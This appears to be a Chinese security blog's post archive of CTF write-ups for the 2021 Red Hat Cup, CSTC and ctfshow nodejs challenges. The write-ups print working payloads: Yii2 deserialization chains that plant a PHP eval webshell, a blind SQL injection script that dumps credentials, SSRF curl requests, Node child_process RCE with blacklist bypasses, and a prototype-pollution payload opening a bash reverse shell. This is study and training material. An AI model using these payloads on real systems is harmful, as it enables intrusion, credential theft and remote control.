一下变成代码，然后把 z0 值传入，如果成功，就成功啦~ 所以上面的 z0 不用传，就是因为菜刀客户端会自动传。2016版不行，因为新版机制不一样了，2333 这是 2011 版本菜刀的包，感觉比 2014版更清晰一点~ 感觉这样一看就捋顺了，顺便收获了人生中语雀的第 1 个赞，泪目 不过还是有点佩服，给这个马的作者对菜刀的机制研究的应该算是比较深入和透彻了，模板.jpg 感觉这马还能起到一丢丢的免杀作用，2333，尤其是在 2011年的时候，估计是比较不错的连接马了。","categories":[{"name":"面白i安全小记","slug":"面白i安全小记","permalink":"https://tari.moe/categories/%E9%9D%A2%E7%99%BDi%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"面白i安全小记","slug":"面白i安全小记","permalink":"https://tari.moe/tags/%E9%9D%A2%E7%99%BDi%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/"},{"name":"中国菜刀","slug":"中国菜刀","permalink":"https://tari.moe/tags/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/"}]},{"title":"2021 红帽杯前3Web题 Writeup","slug":"2021/2021hmb","date":"2021-05-09T15:01:51.000Z","updated":"2021-09-12T13:51:36.297Z","comments":true,"path":"/p/2021/2021hmb/","link":"","permalink":"https://tari.moe/p/2021/2021hmb/","excerpt":"","text":"今年红帽杯好像难度比往年友好了不少 （ find_it目录爆破 &gt; robots.txt &gt; 1ndexx.php &gt; 尝试常见信息泄漏得 .1ndexx.php.swp 访问 http://eci-2zeg1tmyhxfbomoq43gy.cloudeci1.ichunqiu.com/.1ndexx.php.swp 得 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 写入 phpinfo 访问 hack.php 在 phpinfo 页面搜索 flag 关键字即可 framework目录爆破得源码 www.zip 看网页源码和源码易知框架为 Yii2 找控制器， 刚好之前复现了一点 yii2 的反序列化，不过没详细分析 https://www.yuque.com/u2292949/ugffdq/hfgzlc 不过知道控制点在 即通过 call_user_func 调用函数，找个POC，有兴趣可以看看分析过程，传送门 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;phpinfo&#x27;; $this-&gt;id = &quot;123&quot;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; Yii2 的控制器路由说明（即 index.php?r=site/about&amp;message= 部分）可参考 https://www.yiiframework.com/doc/guide/2.0/zh-cn/start-hello 构造 EXP 搜了下发现有 disable function 禁用了这些函数 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return 虽然没有过滤 eval 但 call_user_func 第一个参数只能为回调函数，试了很久，发现 assert 可用，于是构造POC。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;/var/www/html/web/j.php&quot;, \\&#x27;&lt;?php eval($_POST[&quot;s&quot;]); ?&gt;\\&#x27;);&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; 写入一句话，连接 因为有 disable function 限制执行命令，因此需要bypass 尝试常用bypass 方法 无效，然后下面链接有一些姿势没来得及试，等复现出来可以试试 https://www.freebuf.com/articles/network/263540.html 坐等其他师傅WP （ 5月12日更新 突然发现了简单的做法，没想到 phpggc 自定义代码功能还挺好用的 1phpggc Yii2/RCE2 &#x27;eval($_REQUEST[&quot;ant&quot;]);&#x27; | base64 然后绕过 disable function 的方法是 Apache_mode_cgi，晚些搭环境看看为啥比赛时我没法成功绕过的.. WebsiteManger注入点在 image.php 二分法时间延迟注入 脚本来自 Challenger 师傅 1234567891011121314151617181920212223import requestsurl = &#x27;http://eci-2zefme7yqvztnh81ouvm.cloudeci1.ichunqiu.com/image.php?id=&#x27;flag = &quot;&quot;for i in range(1,100): low = 32 high = 128 while low &lt; high: mid = int((low + high) / 2) content = &quot;select/**/group_concat(username,&#x27;:&#x27;,password)/**/from/**/users&quot; sql = f&quot;if(ascii(substr((&#123;content&#125;),&#123;i&#125;,1))&lt;&#123;mid&#125;,1,2)&quot; url2 = url+sql r = requests.get(url2) if len(r.content) == 50811: high = mid else: low = mid + 1 if low == high == 32: print(&quot;&#123;&#125;&quot;.format(flag)) break flag += chr(int((high + low - 1) / 2)) print(&quot;flag : &#123;&#125;&quot;.format(flag)) 使用 admin 和 密码 登录后 SSRF 即可 5月12日更新 看到有人说 modify.php 是可以未授权访问的… ezlight还没看。。。撇了一眼源码，好像是 Laravel？出题人怕不是在 ctfshow 出题的。。 一个 Yii2 一个 Laravel。。。 5月12日更新 晚点如果有环境就复现吧（ 先放一下有第四题wp的题解 总结emm，不知怎么回事，第一题一开始访问 .1ndexx.php.swp 竟然没反应，当然还试了 gedit 的 xx~，佛了 第二题，，一开始 assert 用不了，说什么参数不能是可控的，后面又行了，，这中间找函数和尝试浪费了好多好多时间。。。导致后面绕过 disable function 时间不够。 第三题，总体难度不大 （逃 反思： 虽然之前看了很多 disable function bypass 的文章，但是没动手做过，不够熟练， 把常用 disable function bypass 过一遍 刷了部分然后一直在吃灰的 sqli-labs 是时候理理了…","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"2021CSTC网络安全技术大赛 Writeup","slug":"2021/2021CSTC-ctf","date":"2021-05-06T08:02:43.000Z","updated":"2021-08-12T15:53:58.783Z","comments":true,"path":"/p/2021/2021CSTC-ctf/","link":"","permalink":"https://tari.moe/p/2021/2021CSTC-ctf/","excerpt":"","text":"这次比赛打完，发现自己还是太菜了。。 虽然排名还可以 （因为有逆向大佬在。。。 web2和web3 感觉接近了，现把做出来的写上 看看后面有复现环境会复现，没有的话看下其他师傅的写写复盘。 由于web2和3实在没思路了，然后顺手解了2个简单的杂项。 这里要吐槽一点，为什么题目不是下发 docker 容器形式的，，这样别人如果 getshell 不就可以改代码逻辑搞破坏了吗？ easyweb代码 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET[&#x27;foo&#x27;]);if(is_array($a))&#123; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;])&#123; ($a[&quot;bar1&quot;]&gt;2021)?$v1=1:NULL; &#125; if(is_array(@$a[&quot;bar2&quot;]))&#123; if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123; $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET[&#x27;cat&#x27;];$d=@$_GET[&#x27;dog&#x27;];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;cstc2021&quot;)?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include &quot;flag.php&quot;; echo $flag;&#125;?&gt; bar1 和 bar2 凑一下 eregi函数可用 %00 截断，在凑一下 bar3 即可 payload 1http://49.232.167.183:30001/?foo=&#123;%22bar1%22:%222022a%22,%22bar2%22:[[1],2,3,4,5],%22a2%22:[%22nudt%22]&#125;&amp;cat[0]=%00cstc2021&amp;cat[1][0]=1&amp;dog=222 flag{c32b71bb4aa5c4b2e7a8453f012f9c3e} easyweb2提示1： http://49.232.167.183:30012/swagger-ui.html 提示2： 已经拿到管理员token的队伍，关注/home/index接口 登录爆破获取token 不过这个 token 无效 163a44f5fd4368923e62469611d232a02 爆破 /uid 接口 123&#123;&quot;用户ID&quot;:&quot;987&quot;,&quot;用户组&quot;:&quot;系统管理员&quot;,&quot;用户名&quot;:&quot;ctf_admin&quot;,&quot;HASH&quot;:&quot;2773d5bd7e1a7a7eec619c6d5fbdfd3a&quot;&#125;&#123;&quot;用户ID&quot;:&quot;101&quot;,&quot;用户组&quot;:&quot;普通用户&quot;,&quot;用户名&quot;:&quot;test&quot;,&quot;HASH&quot;:&quot;098f6bcd4621d373cade4e832627b4f6&quot;&#125; md 碰撞出密码得到 Token 19c618e664319512ef7db2d3c0672bee0 访问不到时，会返回 ???? 尝试了以下 EXP和一些变形，不过都读不到 flag，，害 1234567891011121314151617curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/1.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/t1.php&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=dict://127.0.0.1:6379/_info%250a&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=file:///flag&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://0:30012/image/hacker.jpg&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx:2233/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx5:2233/ HTTP/1.1\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 119.28.15.55:2233\\r\\n\\r\\nGET / HTTP/1.1\\r\\ntest:&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://49.232.167.183:30012/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 服务端是java来的，但感觉禁用了 file 之类的协议，， 不过不知道怎样利用，，卡在这了 2021.5.6 17:17 更新 麻了，看了别人题解 https://blog.csdn.net/m0_51078229/article/details/116423096 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://127.0.0.1/flag.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 这个 flag.txt 在哪是猜的还是哪里有提示的？要是因为猜不到文件名而做不出来也太那啥了。。 2021.5.6 22:03 更新 https://blog.csdn.net/qyCraner/article/details/116459918 又找了个题解，发现发送请求请求 ftp 端口 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=ftp://127.0.0.1:21/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 会返回文件信息 1-rw-r--r-- 1 root root 39 Apr 30 09:56 flag.txt 然后在读取就好了….这个试起来有点小麻烦感觉， ，主要是不知道协议、IP和端口…而且题目速度访问速度贼慢，题目本身会保持连接，burp不方便fuzz，这一点感觉要找（弄）个工具 web3目录爆破得 robots.txt &gt; 然后访问 PassOn &gt; &gt; 得到源码 http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip 结合源码reset.php， 其实密码就是时间戳部分，sha1 哈希，取前面 20位 1$password = substr(hash(&#x27;sha1&#x27;, gmdate(&quot;l jS \\of F Y h:i:s A&quot;)), 0, 20); 然后帐号和邮箱在 css/style.css 注释里 重置密码 发现登录不上。。可能压根就不是改了这个密码？ 1$sql = $pdo-&gt;prepare(&quot;UPDATE PassOn SET pass = :pass where id = 1&quot;); 先试试用脚本跑，因为我和别人同时在做，防止时间差 贴贴脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import hashlibimport requestsimport threadingflag = Falseuser = &#x27;Ptn4rdn&#x27;passwd = &#x27;&#x27;email = &#x27;Ptn4rdn@gmail.com&#x27;loginUrl = &#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;resetPassUrl = &#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;def resetPasswd(): global passwd resetData = &#123; &#x27;email&#x27;: email, &#x27;user&#x27;: user, &#x27;submit&#x27;: &#x27;reset&#x27; &#125; gmdate = requests.post(loginUrl, resetData).content[-86:-49] sha1 = hashlib.sha1() sha1.update(gmdate) passwd = sha1.hexdigest()[:20] print(passwd)def login(): global flag, passwd loginData = &#123; &#x27;email&#x27;: email, &#x27;pass&#x27;: passwd, &#x27;submit&#x27;: &#x27;submit&#x27; &#125; res = requests.post(resetPassUrl, loginData) if res.headers.get(&#x27;Cookie&#x27;, 0): flag = True print(passwd) print(res.headers) exit()while flag is False: a = threading.Thread(target=resetPasswd) b = threading.Thread(target=login) a.start() b.start() 不太行。。后面利用大概是有思路了，卡在登录这。。。 2021.5.6 22:09 更新 https://blog.csdn.net/qyCraner/article/details/116459918 找了个题解，发现别人可以正常登录上去的。。不知道我哪步错了，请教一波做出来的师傅。。他也说我做的步骤没毛病，，晕了。 登录进去后就比较简单了，记录失败日志会把邮箱记录到 .php 文件里，把邮箱写成马就行。主要是这个 php 文件，记录 session 信息，如果没登录访问不了这个马。写入马后连接拿flag就好了。 hackerweb这题还没看，堵在第2和第3题了…看看有没有复现环境，主要是别人的wp不是很详细，也还没动手做。 RGB文件为RGB三原色组合，尝试还原图片 1234567891011121314151617181920212223242526from PIL import Imagedef Crack(n): flag = [] for each in range(2,int(n **0.5)+1): if(n % each == 0): print(each,int(n/each)) flag += [(each,int(n/each))] if len(flag) == 1:return flag[0] else: choice = input(&quot;选择第几组(0-%s):&quot;%(len(flag)-1)) return flag[int(choice)]def Paint(X,Y,listrgb): pic = Image.new(&quot;RGB&quot;,(X, Y)) i=0 for x in range (0,X): for y in range (0,Y): temp = listrgb[i].split(&#x27;,&#x27;) pic.putpixel([x,y],(int(temp[0]),int(temp[1]),int(temp[2]))) i = i+1 pic.show() #pic.save(&quot;./flag%s.png&quot;%(X))listrgb = open(&quot;code.txt&quot;).readlines()X,Y = Crack(len(listrgb))Paint(X,Y,listrgb)Paint(Y,X,listrgb) 跑一下脚本选择第 12 组，然后水平翻转一下即可。 flag{c1d836d1db9d42dd} zip压缩包密码爆破得 ff123 readme.txt 。尝试摩斯密码和培根密码，发现是培根密码，跑跑脚本。 12345678910111213141516171819202122import retable = &#123;&#x27;a&#x27;: &#x27;aaaaa&#x27;, &#x27;b&#x27;: &#x27;aaaab&#x27;, &#x27;c&#x27;: &#x27;aaaba&#x27;, &#x27;d&#x27;: &#x27;aaabb&#x27;, &#x27;e&#x27;: &#x27;aabaa&#x27;, &#x27;f&#x27;: &#x27;aabab&#x27;, &#x27;g&#x27;: &#x27;aabba&#x27;, &#x27;h&#x27;: &#x27;aabbb&#x27;, &#x27;i&#x27;: &#x27;abaaa&#x27;, &#x27;j&#x27;: &#x27;abaab&#x27;, &#x27;k&#x27;: &#x27;ababa&#x27;, &#x27;l&#x27;: &#x27;ababb&#x27;, &#x27;m&#x27;: &#x27;abbaa&#x27;, &#x27;n&#x27;: &#x27;abbab&#x27;, &#x27;o&#x27;: &#x27;abbba&#x27;, &#x27;p&#x27;: &#x27;abbbb&#x27;, &#x27;q&#x27;: &#x27;baaaa&#x27;, &#x27;r&#x27;: &#x27;baaab&#x27;, &#x27;s&#x27;: &#x27;baaba&#x27;, &#x27;t&#x27;: &#x27;baabb&#x27;, &#x27;u&#x27;: &#x27;babaa&#x27;, &#x27;v&#x27;: &#x27;babab&#x27;, &#x27;w&#x27;: &#x27;babba&#x27;, &#x27;x&#x27;: &#x27;babbb&#x27;, &#x27;y&#x27;: &#x27;bbaaa&#x27;, &#x27;z&#x27;: &#x27;bbaab&#x27;&#125;def bacon(cipher): msg = &#x27;&#x27; codes = re.findall(r&#x27;.&#123;5&#125;&#x27;, cipher) for code in codes: if code == &#x27;&#x27;: msg += &#x27; &#x27; else: UNCODE = dict(map(lambda t: (t[1], t[0]), table.items())) msg += UNCODE[code] return msgif __name__ == &#x27;__main__&#x27;: cipher = &#x27;BABBBBBAAAABAAB&#x27; cipher = cipher.lower() plaintext = bacon(cipher) print(plaintext) 解出来得知 word 文档密码 xyj 颜色隐藏获取 flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"ctfshow nodejs篇","slug":"2021/ctfshow-nodejs","date":"2021-05-04T13:50:42.000Z","updated":"2022-02-01T04:23:41.578Z","comments":true,"path":"/p/2021/ctfshow-nodejs/","link":"","permalink":"https://tari.moe/p/2021/ctfshow-nodejs/","excerpt":"","text":"web342 很刺激 （ 感觉对原型链污染理解又加深了呢~ web334 JS 大小写特性搜集了半天信息，发现题目描述处有源码可以直接下载。。 user.js 12345module.exports = &#123; items: [ &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125; ]&#125;; login.js 123456789101112131415161718192021222324252627282930313233var express = require(&#x27;express&#x27;);var router = express.Router();var users = require(&#x27;../modules/user&#x27;).items; var findUser = function(name, password)&#123; return users.find(function(item)&#123; return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; &#125;);&#125;;/* GET home page. */router.post(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;flag_here&#x27;; var sess = req.session; var user = findUser(req.body.username, req.body.password); if(user)&#123; req.session.regenerate(function(err) &#123; if(err)&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;); &#125; req.session.loginUser = user.username; res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;,ret_flag:flag&#125;); &#125;); &#125;else&#123; res.json(&#123;ret_code: 1, ret_msg: &#x27;账号或密码错误&#x27;&#125;); &#125; &#125;);module.exports = router; 即满足 1name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; 我们输入的 name 不为 CTFSHOW 然后 name 转换后的大写为 CTFSHOW ，密码为 123456 即可。 网上看了一下，其实想要的考点是 toUpperCase() 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。 toLowerCase() 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。 可以参考 https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 这样的应该是，比如字符 s 或 S 不能出现在输入字符中就好了。 web335 RCEf12 源码提示 1&lt;!-- /?eval= --&gt; 即简单命令执行 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() 获取 flag 1/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString() web336 RCE 黑名单绕过f12 源码提示 1&lt;!-- /?eval= --&gt; 即简单命令执行 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() 获取 flag 1/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString() emm 好像就 flag 文件换了个名字？ 顺便收集多几个命令执行 123require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString() 收集过程中发现，原来第 2、3 个 被禁了，2333 原来考察黑名单 先通过全局变量读取当前目录位置 1/?eval=__filename 当前目录 1/?eval=__dirname 读文件 1/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;) 发现过滤了exec和load 绕过方法 1?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString() 因为 require(&#39;child_process&#39;) 方法返回一个对象，可以通过类型 Python数组的方式去访问里面的成员。 或者用其他模块读文件 12/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;) 当然还有其他姿势，比如变量拼接在执行 1var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc); web337 md5绕过12345678910111213141516171819202122232425var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;xxxxxxx&#x27;; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;); &#125; &#125;);module.exports = router; 和 PHP 一样，数组绕过即可 1/?a[]=1&amp;b=1 发现这样更易于理解 payload: a[x]=1&amp;b[x]=2 运行一下代码 1234567891011a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)a=[1]b=[2]console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) web338 原型链污染题目描述处蓝奏云下载源码 📎web338.zip 先看看这篇文章了解一波什么是 JS 的原型链污染 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 关键代码 utils/common.js 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125; routes/login.js 123456var secert = &#123;&#125;;....utils.copy(user,req.body); if(secert.ctfshow===&#x27;36dboy&#x27;)&#123; res.end(flag); &#125; 也就是说，我们不用关心 secert 是否有 ctfshow 这个属性，因为当它找不到这个属性时，它会从它自己的原型里找。 这里的 secert 是一个数组，然后 utils.copy(user,req.body); 操作是 user 也是数组，也就是我们通过 req.body 即 POST 请求体传入参数，通过 user 污染数组的原型，那么 secert 数组找不到 ctfshow 属性时，会一直往原型找，直到在数组原型中发现 ctfshow 属性值为 36dboy 。那么 if 语句即判断成功，就会输出 flag 了。 payload 1&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125; 一般遇到这种整套代码，特别是带有 package.json 的，可以尝试 snyk ， 发现个 ejs 的 RCE https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; 先污染参数 然后随便请求一下，触发 render 方法 成功反弹 shell 不过 snyk 给出的 poc 用 filename 参数利用好像有点问题， 不太清楚为啥。。即 1&#123;&quot;__proto__&quot;:&#123;&quot;filename&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; 顺便记录一下 node 项目本地启动方法，在项目文件运行下面命令即可。 1npm start 默认端口为 3000 web339 原型链污染 +node/v10.19.0 题目描述处蓝奏云下载源码 📎web339.zip 和 web338 有点相似，不过不同点是 123456var flag=&#x27;flag_here&#x27;;....utils.copy(user,req.body);if(secert.ctfshow===flag)&#123; res.end(flag); &#125; flag 是变量，具体值不知 然后还多了个 api.js ，主要关注这行 1res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;); 是不是和 web338 里的参考链接 PHITHON 师傅出的 Code-Breaking 2018 Thejs 如出一辙？即可以 RCE，因为这里可污染点存在的匿名函数调用 https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225 仿照题目中的代码，先写个小demo 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; 为什么 query 的值是 2233 呢？也就是为啥会被调用了呢？ 首先看看 query 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 